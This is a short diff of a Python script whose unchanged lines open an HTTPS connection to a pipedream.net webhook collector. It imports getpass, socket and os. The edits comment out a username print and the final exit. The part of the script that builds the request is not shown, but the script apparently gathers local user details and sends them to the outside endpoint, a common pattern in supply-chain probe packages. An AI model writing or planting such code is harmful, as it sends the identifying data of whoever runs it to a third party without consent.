@@ -6,7 +6,7 @@ import socket
 import getpass
 import os
 
-print("[" + getpass.getuser() +" ]")
+# print("[" + getpass.getuser() +" ]")
 
 conn = http.client.HTTPSConnection('45916c134a9cdb740e1c9807952ed21d.m.pipedream.net')
 
@@ -21,4 +21,4 @@ response = conn.getresponse()
 # print(response.read().decode())
 
 
-sys.exit(0)
+# sys.exit(0)
